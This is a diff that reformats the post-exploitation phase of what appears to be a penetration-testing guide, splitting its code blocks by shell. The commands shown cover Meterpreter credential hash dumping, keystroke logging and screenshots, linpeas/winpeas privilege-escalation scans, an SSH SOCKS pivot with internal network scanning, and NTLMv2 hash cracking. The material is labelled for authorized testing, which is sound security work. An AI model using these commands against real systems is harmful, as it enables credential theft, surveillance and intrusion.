@@ -257,20 +257,31 @@ hashcat -m 5600 captured_ntlmv2.hash /usr/share/wordlists/rockyou.txt -r /usr/sh
 
 ## Phase 5 — Post-Exploitation
 
-```bash
+In the Meterpreter session; omit the displayed prompts:
+
+```text
 # Establish persistence (authorized testing only)
 # Meterpreter session
 meterpreter> sysinfo
 meterpreter> getuid
 meterpreter> hashdump
 meterpreter> run post/multi/recon/local_exploit_suggester
+```
 
+```bash
 # Privilege escalation check
 # Linux
 ./linpeas.sh | tee linpeas_output.txt
+```
+
+In PowerShell on the Windows host:
+
+```powershell
 # Windows
 .\winPEAS.exe | tee winpeas_output.txt
+```
 
+```bash
 # Data exfiltration proof
 # Create proof file (DO NOT exfiltrate real sensitive data)
 echo "PENTEST-PROOF-$(date +%Y%m%d)" > /tmp/pentest_proof.txt
@@ -279,7 +290,11 @@ echo "PENTEST-PROOF-$(date +%Y%m%d)" > /tmp/pentest_proof.txt
 # Set up SOCKS proxy via SSH
 ssh -D 9050 user@203.0.113.15
 proxychains nmap -sT -p 80,443,445 10.0.0.0/24
+```
 
+In the Meterpreter session; omit the displayed prompts:
+
+```text
 # Screenshot and evidence collection
 meterpreter> screenshot
 meterpreter> keyscan_start
